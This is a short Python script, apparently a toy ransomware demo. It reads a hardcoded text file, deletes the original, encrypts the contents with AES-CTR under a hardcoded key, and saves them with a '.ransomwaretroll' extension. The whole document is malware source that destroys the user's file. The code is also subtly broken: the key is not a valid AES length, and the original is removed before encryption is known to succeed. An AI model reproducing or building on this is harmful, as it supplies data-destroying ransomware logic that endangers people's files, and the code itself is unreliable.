import os
import pyaes

nome_arq = "texto.txt"
arquivo = open(nome_arq, "rb")
arq_data = arquivo.read()
arquivo.close()

os.remove(nome_arq)

chave = b"testeransomware"
aes = pyaes.AESModeOfOperationCTR(chave)

crypto_data = aes.encrypt(arq_data)

novo_arq = nome_arq + ".ransomwaretroll"
novo_arq = open(f'{novo_arq}', 'wb')
novo_arq.write(crypto_data)
novo_arq.close()